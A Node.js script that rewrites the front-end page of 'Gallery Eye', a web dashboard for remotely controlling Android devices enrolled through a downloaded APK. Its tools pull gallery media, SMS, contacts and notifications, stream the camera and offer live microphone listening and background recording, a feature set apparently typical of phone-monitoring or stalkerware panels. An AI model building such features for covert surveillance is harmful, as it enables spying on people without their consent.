const fs = require('fs');
const file = "c:/Users/Usman Pasha/Documents/GitHub/FRONT-GALLERY/src/app/page.tsx";
let content = fs.readFileSync(file, 'utf8');

// 1. Replace imports
content = content.replace(
    /import CustomAlertModal from "@\/components\/CustomAlertModal";/,
`import CustomAlertModal from "@/components/CustomAlertModal";
import { motion, AnimatePresence } from "framer-motion";
import { 
    Image as ImageIcon, MessageSquare, Users, Flashlight, Vibrate, Camera, 
    Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, 
    Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare 
} from 'lucide-react';
import AppShell from "@/components/AppShell";`
);

// 2. Replace the return statement
const returnStartStr = `    return (\n        <main className="min-h-[100dvh] pb-8 sm:pb-8" style={{ background: 'var(--bg-base)', color: 'var(--text-primary)', paddingBottom: 'max(2rem, calc(var(--tab-bar-height) + env(safe-area-inset-bottom, 0px) + 16px))' }}>`;
const startIndex = content.indexOf(returnStartStr);

if (startIndex === -1) {
    console.error("Could not find start index");
    process.exit(1);
}

// Find the last '    );\n}'
const lastBraceIndex = content.lastIndexOf('    );\n}');
if (lastBraceIndex === -1) {
    console.error("Could not find end index");
    process.exit(1);
}

const newReturnBlock = `    // Helper to render tools
    const renderTool = () => {
        if (!selectedDeviceId && devices.filter(d => d.online).length === 0) {
            return (
                <div className="flex flex-col items-center justify-center min-h-[60vh] text-center">
                    <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="max-w-md space-y-6">
                        <div className="w-24 h-24 mx-auto rounded-3xl bg-white/5 border border-white/10 flex items-center justify-center shadow-2xl">
                            <Smartphone size={48} className="text-emerald-400" />
                        </div>
                        <div>
                            <h2 className="text-3xl font-bold tracking-tight mb-2">Welcome to Gallery Eye</h2>
                            <p className="text-white/40">Download the app on your device and select it from the menu to begin remote management.</p>
                        </div>
                        <button onClick={() => setShowAppModal(true)} className="btn-primary w-full shadow-emerald-500/20 flex items-center justify-center">
                            <Download size={18} /> Download APK
                        </button>
                    </motion.div>
                </div>
            );
        }

        switch (selectedTool) {
            case 'gallery':
                return (
                    <div className="space-y-6">
                        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                            <div>
                                <h2 className="text-2xl font-bold tracking-tight">Gallery Sync</h2>
                                <p className="text-sm text-white/40">Browse and manage media files remotely.</p>
                            </div>
                            <div className="flex flex-wrap items-center gap-2">
                                <button onClick={fetchFolders} disabled={!selectedDeviceId} className="btn-secondary">
                                    <RefreshCw size={16} className={isFetchingGallery ? "animate-spin" : ""} /> Refresh
                                </button>
                                {isSelectionMode && (
                                    <>
                                        <button onClick={downloadSelected} disabled={isDownloading} className="btn-primary">
                                            <Download size={16} /> {isDownloading ? 'Downloading...' : 'Download'}
                                        </button>
                                        <button onClick={deleteSelected} disabled={isDeleting} className="btn-secondary text-red-400 hover:text-red-300 border-red-400/20 hover:bg-red-400/10">
                                            <Trash2 size={16} /> {isDeleting ? 'Deleting...' : 'Delete'}
                                        </button>
                                    </>
                                )}
                            </div>
                        </div>

                        {!selectedFolder && folders.length > 0 && (
                            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                                {folders.map((folder, i) => (
                                    <motion.button 
                                        key={i}
                                        whileHover={{ scale: 1.02 }}
                                        whileTap={{ scale: 0.98 }}
                                        onClick={() => handleFolderClick(folder)}
                                        className="p-5 rounded-2xl bezel bezel-inner flex flex-col gap-4 text-left transition-colors hover:border-emerald-500/50 group"
                                    >
                                        <div className="w-12 h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center group-hover:bg-emerald-500/20 transition-colors">
                                            <ImageIcon size={24} className="text-emerald-400" />
                                        </div>
                                        <div>
                                            <h3 className="font-semibold truncate text-white">{folder.name}</h3>
                                            <p className="text-xs text-white/40 mt-1 font-data">{folder.count || 0} items</p>
                                        </div>
                                    </motion.button>
                                ))}
                            </div>
                        )}

                        {selectedFolder && (
                            <div className="p-6 rounded-2xl bezel bezel-inner mb-6 relative overflow-hidden">
                                <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 blur-[80px] pointer-events-none rounded-full" />
                                <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
                                    <div className="flex items-center gap-3">
                                        <button onClick={() => setSelectedFolder(null)} className="p-2 rounded-lg bg-white/5 hover:bg-white/10 transition-colors">
                                            <ChevronDown size={20} className="rotate-90" />
                                        </button>
                                        <h3 className="text-xl font-bold tracking-tight">{selectedFolder.name}</h3>
                                    </div>
                                    {syncMediaType && (
                                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-wrap gap-2 w-full md:w-auto">
                                            <button onClick={() => triggerUpload(5)} className="btn-secondary text-xs py-1.5 px-3">Sync 5</button>
                                            <button onClick={() => triggerUpload(20)} className="btn-secondary text-xs py-1.5 px-3">Sync 20</button>
                                            <button onClick={() => triggerUpload(50)} className="btn-secondary text-xs py-1.5 px-3">Sync 50</button>
                                            <button onClick={() => {
                                                setSyncOptionsFolder({ name: selectedFolder.name, count: selectedFolder.count, type: syncMediaType });
                                                setShowSyncOptionsModal(true);
                                            }} className="btn-primary text-xs py-1.5 px-3 ml-auto md:ml-0">Sync All</button>
                                        </motion.div>
                                    )}
                                </div>
                                <div className="flex items-center gap-4 relative z-10">
                                    <button onClick={() => setSyncMediaType('image')} className={\`flex-1 p-4 rounded-xl border \${syncMediaType === 'image' ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-white/5 border-white/10 hover:bg-white/10'} transition-all\`}>
                                        <ImageIcon size={24} className="mx-auto mb-2" />
                                        <div className="text-center font-medium">Photos</div>
                                    </button>
                                    <button onClick={() => setSyncMediaType('video')} className={\`flex-1 p-4 rounded-xl border \${syncMediaType === 'video' ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-white/5 border-white/10 hover:bg-white/10'} transition-all\`}>
                                        <Video size={24} className="mx-auto mb-2" />
                                        <div className="text-center font-medium">Videos</div>
                                    </button>
                                </div>
                            </div>
                        )}

                        <div className="flex flex-wrap items-center gap-2 mb-4">
                            {(['all', 'image', 'video'] as const).map(tab => (
                                <button key={tab} onClick={() => setActiveTab(tab)} className={\`px-4 py-1.5 rounded-full text-sm font-medium transition-colors \${activeTab === tab ? 'bg-white text-black' : 'bg-white/10 text-white/60 hover:text-white'}\`}>
                                    {tab.charAt(0).toUpperCase() + tab.slice(1)}s
                                </button>
                            ))}
                            <button onClick={selectAll} className="ml-auto flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm bg-white/5 hover:bg-white/10 transition-colors font-medium">
                                <CheckSquare size={16} /> Select All
                            </button>
                        </div>
                        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
                            {filteredImages.map((img) => (
                                <div key={img.id} onClick={() => toggleSelection(img.id)} className={\`relative aspect-square rounded-xl overflow-hidden cursor-pointer group border-2 transition-all \${selectedItems.has(img.id) ? 'border-emerald-400 scale-[0.97]' : 'border-transparent hover:border-white/20'}\`}>
                                    {img.resource_type === 'video' ? (
                                        <video src={img.url} className="w-full h-full object-cover" />
                                    ) : (
                                        <img src={img.url} alt="Gallery" className="w-full h-full object-cover" loading="lazy" />
                                    )}
                                    <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                                        <button onClick={(e) => { e.stopPropagation(); setPreviewItem(img); }} className="p-3 rounded-full bg-white/20 backdrop-blur-md hover:bg-white/30 transition-colors">
                                            <Search size={20} className="text-white" />
                                        </button>
                                    </div>
                                    {selectedItems.has(img.id) && (
                                        <div className="absolute top-2 right-2 w-6 h-6 rounded-full bg-emerald-500 shadow-lg flex items-center justify-center animate-scaleIn">
                                            <Check size={14} className="text-black" />
                                        </div>
                                    )}
                                </div>
                            ))}
                        </div>
                        {galleryHasMore && <div ref={galleryLoaderRef} className="h-20 flex items-center justify-center"><div className="w-6 h-6 rounded-full border-2 border-emerald-500/30 border-t-emerald-500 animate-spin" /></div>}
                    </div>
                );
            case 'sms':
            case 'contacts':
                const isSms = selectedTool === 'sms';
                const items = isSms ? filteredSms : filteredContacts;
                const search = isSms ? smsSearchQuery : contactsSearchQuery;
                const setSearch = isSms ? setSmsSearchQuery : setContactsSearchQuery;
                const fetchFn = isSms ? fetchSms : fetchContacts;
                const isFetching = isSms ? isFetchingSms : isFetchingContacts;

                return (
                    <div className="space-y-6 h-full flex flex-col">
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4">
                            <div>
                                <h2 className="text-2xl font-bold tracking-tight">{isSms ? 'Messages' : 'Contacts'}</h2>
                                <p className="text-sm text-white/40">View and backup device {isSms ? 'SMS' : 'contacts'}.</p>
                            </div>
                            <div className="flex items-center gap-2">
                                <button onClick={fetchFn} disabled={!selectedDeviceId || isFetching} className="btn-primary">
                                    <RefreshCw size={16} className={isFetching ? "animate-spin" : ""} /> Sync {isSms ? 'SMS' : 'Contacts'}
                                </button>
                                {isSms ? (
                                    <button onClick={downloadSmsAsCsv} className="btn-secondary"><Download size={16}/> CSV</button>
                                ) : (
                                    <button onClick={downloadContactsAsVcf} className="btn-secondary"><Download size={16}/> vCard</button>
                                )}
                            </div>
                        </div>
                        <div className="relative flex-shrink-0">
                            <Search size={18} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40" />
                            <input 
                                type="text" 
                                placeholder="Search..." 
                                value={search}
                                onChange={(e) => setSearch(e.target.value)}
                                className="input-field pl-11 bg-white/5 border-white/10"
                            />
                        </div>
                        <div className="flex-1 overflow-y-auto bezel bezel-inner rounded-2xl p-2 scrollbar-hide">
                            <div className="flex flex-col gap-1">
                                {items.length === 0 ? (
                                    <div className="py-20 flex items-center justify-center text-white/40 font-medium">No items found. Click sync to fetch.</div>
                                ) : (
                                    items.map((item, i) => (
                                        <div key={i} className="p-4 rounded-xl bg-transparent hover:bg-white/5 transition-colors flex gap-4 border-b border-white/5 last:border-0">
                                            <div className={\`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 \${isSms ? 'bg-sky-500/10 text-sky-400' : 'bg-indigo-500/10 text-indigo-400'}\`}>
                                                {isSms ? <MessageSquare size={18} /> : <Users size={18} />}
                                            </div>
                                            <div className="flex-1 min-w-0 flex flex-col justify-center">
                                                <div className="flex items-center justify-between mb-0.5">
                                                    <h4 className="font-semibold truncate text-white/90 text-sm">{isSms ? item.address : item.name}</h4>
                                                    {isSms && <span className="text-xs text-white/40 font-data flex-shrink-0 ml-2">{new Date(item.date).toLocaleDateString()}</span>}
                                                </div>
                                                <p className="text-sm text-white/50 truncate">{isSms ? item.body : (item.phones?.[0]?.number || item.phones?.[0] || 'No number')}</p>
                                            </div>
                                        </div>
                                    ))
                                )}
                            </div>
                        </div>
                    </div>
                );
            case 'camera':
            case 'audio':
                const isCam = selectedTool === 'camera';
                return (
                    <div className="flex flex-col items-center justify-center min-h-[60vh] py-8">
                        <div className="w-full max-w-xl bezel bezel-inner rounded-[2.5rem] p-8 sm:p-12 text-center space-y-8 relative overflow-hidden">
                            <div className={\`absolute top-[-20%] right-[-20%] w-[60%] h-[60%] blur-[100px] rounded-full pointer-events-none \${isCam ? 'bg-pink-500/20' : 'bg-amber-500/20'}\`} />
                            <div className={\`w-24 h-24 mx-auto rounded-[2rem] flex items-center justify-center shadow-2xl relative z-10 \${isCam ? 'bg-pink-500/10 text-pink-400 border border-pink-500/20' : 'bg-amber-500/10 text-amber-400 border border-amber-500/20'}\`}>
                                {isCam ? <Camera size={40} /> : <Mic size={40} />}
                            </div>
                            <div className="relative z-10">
                                <h2 className="text-3xl font-bold tracking-tight mb-3">Live {isCam ? 'Camera' : 'Audio'} Feed</h2>
                                <p className="text-white/40 max-w-sm mx-auto text-sm leading-relaxed">Remotely trigger the device's {isCam ? 'camera to capture high-res photos or stream video' : 'microphone for live listening or background recording'}.</p>
                            </div>
                            <div className="flex flex-wrap items-center justify-center gap-3 relative z-10">
                                {isCam ? (
                                    <>
                                        <button 
                                            onClick={() => { setIsCapturingPhoto(true); socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); }}
                                            disabled={isCapturingPhoto}
                                            className="btn-primary py-3 px-6 rounded-xl bg-white/10 hover:bg-white/20 text-white shadow-none"
                                        >
                                            {isCapturingPhoto ? <RefreshCw className="animate-spin" size={18}/> : <Camera size={18} />}
                                            Capture Photo
                                        </button>
                                        <button 
                                            onClick={() => {
                                                if (isLiveStreaming) {
                                                    socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                    setIsLiveStreaming(false);
                                                } else {
                                                    socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
                                                    setIsLiveStreaming(true);
                                                }
                                            }}
                                            className={\`btn-primary py-3 px-6 rounded-xl \${isLiveStreaming ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-emerald-500 hover:bg-emerald-600 shadow-lg shadow-emerald-500/20'}\`}
                                        >
                                            {isLiveStreaming ? <Square size={18} /> : <Video size={18} />}
                                            {isLiveStreaming ? 'Stop Stream' : 'Live Stream'}
                                        </button>
                                        <button 
                                            onClick={() => {
                                                if (isRecording) {
                                                    socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                    setIsRecording(false);
                                                } else {
                                                    setIsRecording(true);
                                                    setRecordingProgress({ current: 0, total: recordingDuration });
                                                    socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
                                                }
                                            }}
                                            className={\`btn-primary py-3 px-6 rounded-xl \${isRecording ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-pink-500 hover:bg-pink-600 shadow-lg shadow-pink-500/20'}\`}
                                        >
                                            {isRecording ? <Square size={18} /> : <Video size={18} />}
                                            {isRecording ? 'Stop Recording' : 'Record Video'}
                                        </button>
                                    </>
                                ) : (
                                    <>
                                        <button 
                                            onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}
                                            className={\`btn-primary py-3 px-6 rounded-xl \${isLiveAudio ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-amber-500 hover:bg-amber-600 shadow-lg shadow-amber-500/20'}\`}
                                        >
                                            {isLiveAudio ? <Square size={18} /> : <Play size={18} />}
                                            {isLiveAudio ? 'Stop Live Listening' : 'Live Listen'}
                                        </button>
                                        <button 
                                            onClick={isVoiceRecording ? stopVoiceRecording : startVoiceRecording}
                                            className={\`btn-secondary py-3 px-6 rounded-xl \${isVoiceRecording ? 'text-red-400 border-red-400/50 hover:bg-red-500/10' : ''}\`}
                                        >
                                            {isVoiceRecording ? <Square size={18} /> : <Mic size={18} />}
                                            {isVoiceRecording ? 'Stop Recording' : 'Record Voice'}
                                        </button>
                                    </>
                                )}
                            </div>
                            
                            {isLiveAudio && (
                                <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="mt-8 p-6 rounded-2xl bg-black/40 border border-white/5 flex flex-col items-center gap-4 relative z-10 w-full">
                                    <div className="flex items-center gap-2 bg-red-500/10 px-3 py-1 rounded-full border border-red-500/20">
                                        <div className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse shadow-[0_0_12px_rgba(239,68,68,0.8)]" />
                                        <span className="text-xs font-bold text-red-400 font-data tracking-wider uppercase">Live • {formatTime(audioElapsed)}</span>
                                    </div>
                                    <div className="flex items-center justify-center gap-1.5 h-16 w-full px-4">
                                        {Array.from({length: 24}).map((_, i) => (
                                            <div 
                                                key={i} 
                                                className="w-1.5 bg-amber-400 rounded-full transition-all duration-75"
                                                style={{ height: \`\${Math.max(15, audioLevel * 100 * Math.random())}%\`, opacity: Math.max(0.3, audioLevel * Math.random() * 2) }}
                                            />
                                        ))}
                                    </div>
                                </motion.div>
                            )}

                            {isCam && isLiveStreaming && liveFrame && (
                                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mt-8 rounded-2xl overflow-hidden border border-white/10 aspect-[3/4] sm:aspect-video relative bg-black shadow-2xl relative z-10 w-full">
                                    <img src={\`data:image/jpeg;base64,\${liveFrame}\`} className="w-full h-full object-contain" alt="Live Feed" />
                                    <div className="absolute top-4 right-4 flex items-center gap-2 bg-black/60 backdrop-blur-xl px-3 py-1.5 rounded-full border border-white/10 shadow-lg">
                                        <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                                        <span className="text-xs font-bold text-white tracking-widest font-data">LIVE</span>
                                    </div>
                                </motion.div>
                            )}
                        </div>
                    </div>
                );
            case 'torch':
            case 'vibration':
                const isTorch = selectedTool === 'torch';
                return (
                    <div className="flex flex-col items-center justify-center min-h-[60vh]">
                        <div className="max-w-md w-full bezel bezel-inner rounded-[2.5rem] p-12 text-center space-y-12 relative overflow-hidden">
                            <div className={\`absolute top-0 left-0 w-full h-full bg-gradient-to-br from-white/5 to-transparent pointer-events-none transition-opacity duration-500 \${isTorch && isTorchOn ? 'opacity-0' : 'opacity-100'}\`} />
                            {isTorch && isTorchOn && <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full bg-yellow-400/20 blur-[100px] pointer-events-none" />}
                            
                            <div className="space-y-3 relative z-10">
                                <h2 className="text-3xl font-bold tracking-tight">{isTorch ? 'Flashlight' : 'Vibration'}</h2>
                                <p className="text-white/40 text-sm">Toggle the device's {isTorch ? 'flash LED' : 'haptic motor'} remotely.</p>
                            </div>
                            
                            <button 
                                onClick={isTorch ? toggleTorch : triggerVibration}
                                className={\`relative w-48 h-48 mx-auto rounded-full flex items-center justify-center transition-all duration-500 ease-[cubic-bezier(0.34,1.56,0.64,1)] group z-10 \${
                                    isTorch && isTorchOn 
                                        ? 'bg-yellow-400 shadow-[0_0_80px_rgba(250,204,21,0.6),inset_0_-8px_20px_rgba(0,0,0,0.2)] scale-105' 
                                        : 'bg-gradient-to-b from-white/10 to-white/5 border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.4),inset_0_1px_1px_rgba(255,255,255,0.2)] hover:scale-105'
                                }\`}
                            >
                                <div className={\`absolute inset-2 rounded-full border transition-colors duration-500 \${isTorch && isTorchOn ? 'border-yellow-300/50' : 'border-white/5 group-hover:border-white/10'}\`} />
                                {isTorch ? (
                                    <Flashlight size={64} className={\`transition-colors duration-500 \${isTorchOn ? 'text-yellow-900 drop-shadow-md' : 'text-yellow-400/80 group-hover:text-yellow-400'}\`} />
                                ) : (
                                    <Vibrate size={64} className="text-orange-400/80 group-hover:text-orange-400 transition-colors" />
                                )}
                            </button>
                        </div>
                    </div>
                );
            case 'notifications':
                return (
                    <div className="space-y-6 h-full flex flex-col">
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4">
                            <div>
                                <h2 className="text-2xl font-bold tracking-tight">Alerts & Notifications</h2>
                                <p className="text-sm text-white/40">Monitor device push notifications.</p>
                            </div>
                            <div className="flex items-center gap-3 bg-white/5 px-4 py-2.5 rounded-xl border border-white/10">
                                <span className="text-sm font-medium text-white/80">Monitoring</span>
                                <button 
                                    onClick={() => socket?.emit('toggle_notification_monitor', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, enable: !isMonitoringNotifications })}
                                    className={\`relative w-12 h-6 rounded-full transition-colors duration-300 \${isMonitoringNotifications ? 'bg-cyan-500' : 'bg-white/20'}\`}
                                >
                                    <div className={\`absolute top-1 left-1 w-4 h-4 rounded-full bg-white transition-transform duration-300 shadow-sm \${isMonitoringNotifications ? 'translate-x-6' : 'translate-x-0'}\`} />
                                </button>
                            </div>
                        </div>
                        <div className="flex gap-2 overflow-x-auto scrollbar-hide pb-2 flex-shrink-0">
                            {notifAppFilters.map(filter => (
                                <button
                                    key={filter.key}
                                    onClick={() => setSelectedNotifApp(filter.key)}
                                    className={\`px-5 py-2 rounded-full text-sm font-medium whitespace-nowrap transition-all border \${
                                        selectedNotifApp === filter.key 
                                            ? 'bg-cyan-500/10 border-cyan-500/30 text-cyan-400 shadow-sm' 
                                            : 'bg-white/5 border-white/5 text-white/50 hover:bg-white/10 hover:text-white'
                                    }\`}
                                >
                                    {filter.label}
                                </button>
                            ))}
                        </div>
                        <div className="flex-1 overflow-y-auto space-y-3 scrollbar-hide">
                            {notifications.filter(n => selectedNotifApp === 'all' || notifAppFilters.find(f => f.key === selectedNotifApp)?.packages.includes(n.packageName)).length === 0 ? (
                                <div className="h-[40vh] flex flex-col items-center justify-center text-center space-y-4">
                                    <div className="w-16 h-16 rounded-2xl bg-white/5 flex items-center justify-center border border-white/5">
                                        <Bell size={24} className="text-white/20" />
                                    </div>
                                    <div className="text-white/40 font-medium text-sm">No notifications recorded yet.<br/>Ensure monitoring is active and the device is online.</div>
                                </div>
                            ) : (
                                notifications.filter(n => selectedNotifApp === 'all' || notifAppFilters.find(f => f.key === selectedNotifApp)?.packages.includes(n.packageName)).map((notif, i) => (
                                    <div key={i} className="p-5 rounded-2xl bg-white/5 border border-white/5 hover:border-white/10 hover:bg-white/[0.07] transition-colors flex flex-col sm:flex-row gap-4 sm:items-start">
                                        <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border border-cyan-500/10 flex items-center justify-center flex-shrink-0">
                                            <Bell size={18} className="text-cyan-400" />
                                        </div>
                                        <div className="flex-1 min-w-0">
                                            <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-1 gap-1">
                                                <span className="font-semibold text-sm text-cyan-400">{notif.appName || notif.packageName}</span>
                                                <span className="text-xs text-white/40 font-data">{new Date(notif.receivedAt || notif.timestamp).toLocaleString()}</span>
                                            </div>
                                            <h4 className="font-medium text-white/90 mb-1 text-base">{notif.title}</h4>
                                            <p className="text-sm text-white/60 leading-relaxed">{notif.text}</p>
                                        </div>
                                    </div>
                                ))
                            )}
                        </div>
                    </div>
                );
            default:
                return (
                    <div className="h-[60vh] flex items-center justify-center">
                        <div className="text-white/40 font-medium">Select a tool from the menu to begin.</div>
                    </div>
                );
        }
    };

    return (
        <AppShell
            session={session}
            userPlan={userPlan}
            devices={devices}
            selectedDeviceId={selectedDeviceId}
            setSelectedDeviceId={setSelectedDeviceId}
            onlineDeviceCount={onlineDeviceCount}
            selectedTool={selectedTool}
            setSelectedTool={setSelectedTool}
            onLogout={() => signOut()}
            onOpenSettings={() => setIsSettingsOpen(true)}
            onOpenPlans={() => setShowPlansModal(true)}
            onOpenAppModal={() => setShowAppModal(true)}
        >
            <div className="w-full h-full relative">
                {renderTool()}
            </div>

            {/* Modals */}
            <AppGenerationModal isOpen={showAppModal} onClose={() => setShowAppModal(false)} />
            <WhatsAppButton />
            <PlansModal isOpen={showPlansModal} onClose={() => setShowPlansModal(false)} currentPlan={userPlan} />
            <UpgradeModal isOpen={showUpgradeModal} onClose={() => setShowUpgradeModal(false)} feature={upgradeFeature} requiredPlan={requiredPlan} currentPlan={userPlan} onUpgrade={() => setShowPlansModal(true)} />
            
            <SyncOptionsModal
                isOpen={showSyncOptionsModal}
                onClose={() => setShowSyncOptionsModal(false)}
                folderName={syncOptionsFolder.name}
                itemCount={syncOptionsFolder.count}
                onSelectOneByOne={(count) => {
                    socket?.emit('trigger_sync', {
                        uuid: session?.user?.uuid,
                        targetDeviceId: selectedDeviceId,
                        folderName: syncOptionsFolder.name,
                        count,
                        mediaType: syncOptionsFolder.type
                    });
                    setShowSyncOptionsModal(false);
                }}
                onSelectZip={() => {
                    setZipProgress({ stage: 'creating', current: 0, total: syncOptionsFolder.count, url: '', error: '' });
                    setShowZipProgressModal(true);
                    socket?.emit('trigger_zip', {
                        uuid: session?.user?.uuid,
                        targetDeviceId: selectedDeviceId,
                        folderName: syncOptionsFolder.name,
                        mediaType: syncOptionsFolder.type
                    });
                    setShowSyncOptionsModal(false);
                }}
                userPlan={userPlan}
                onUpgrade={() => setShowPlansModal(true)}
            />

            <ZipProgressModal
                isOpen={showZipProgressModal}
                onClose={() => setShowZipProgressModal(false)}
                stage={zipProgress.stage}
                current={zipProgress.current}
                total={zipProgress.total}
                folderName={syncOptionsFolder.name}
                downloadUrl={zipProgress.url}
                error={zipProgress.error}
            />

            <CustomAlertModal
                isOpen={showCustomAlert}
                onClose={() => setShowCustomAlert(false)}
                title={alertData.title}
                message={alertData.message}
                type={alertData.type}
            />

            <AnimatePresence>
                {(uploadProgress || isStartingSync) && (
                    <motion.div 
                        initial={{ opacity: 0, y: 50, scale: 0.9 }}
                        animate={{ opacity: 1, y: 0, scale: 1 }}
                        exit={{ opacity: 0, y: 50, scale: 0.9 }}
                        className="fixed bottom-6 right-6 md:bottom-10 md:right-10 z-[500] p-6 rounded-2xl glass-strong border border-emerald-500/30 shadow-2xl flex items-center gap-5 min-w-[320px]"
                    >
                        <div className="w-12 h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center flex-shrink-0 shadow-[inset_0_0_12px_rgba(16,185,129,0.2)]">
                            <RefreshCw size={24} className="text-emerald-400 animate-spin" />
                        </div>
                        <div className="flex-1 w-full min-w-0">
                            <h4 className="font-semibold text-white/90 text-sm">Syncing Media</h4>
                            <div className="w-full h-1.5 bg-white/10 rounded-full mt-2.5 overflow-hidden">
                                <div 
                                    className="h-full bg-gradient-to-r from-emerald-500 to-emerald-400 transition-all duration-300 rounded-full shadow-[0_0_10px_rgba(16,185,129,0.5)]" 
                                    style={{ width: uploadProgress ? \`\${(uploadProgress.uploaded / uploadProgress.total) * 100}%\` : '5%' }} 
                                />
                            </div>
                            {uploadProgress && (
                                <div className="flex justify-between mt-2 text-xs font-data text-white/50">
                                    <span>{uploadProgress.uploaded} / {uploadProgress.total}</span>
                                    <span>{Math.round((uploadProgress.uploaded / uploadProgress.total) * 100)}%</span>
                                </div>
                            )}
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            <AnimatePresence>
                {previewItem && (
                    <motion.div 
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[600] bg-black/90 backdrop-blur-2xl flex items-center justify-center p-4 md:p-8"
                        onClick={() => setPreviewItem(null)}
                    >
                        <motion.div 
                            initial={{ scale: 0.95, opacity: 0 }}
                            animate={{ scale: 1, opacity: 1 }}
                            exit={{ scale: 0.95, opacity: 0 }}
                            className="relative max-w-6xl w-full h-full flex items-center justify-center"
                            onClick={(e) => e.stopPropagation()}
                        >
                            {previewItem.resource_type === 'video' ? (
                                <video src={previewItem.url} controls autoPlay className="max-w-full max-h-full rounded-xl shadow-[0_0_40px_rgba(0,0,0,0.5)] border border-white/10" />
                            ) : (
                                <img src={previewItem.url} alt="Preview" className="max-w-full max-h-full object-contain rounded-xl shadow-[0_0_40px_rgba(0,0,0,0.5)] border border-white/10" />
                            )}
                            <button onClick={() => setPreviewItem(null)} className="absolute top-4 right-4 p-3 rounded-full bg-white/10 hover:bg-white/20 text-white backdrop-blur-md transition-colors border border-white/10">
                                <X size={24} />
                            </button>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>
        </AppShell>
    );
}
`;

content = content.substring(0, startIndex) + newReturnBlock;

fs.writeFileSync(file, content, 'utf8');
console.log("Refactoring complete");
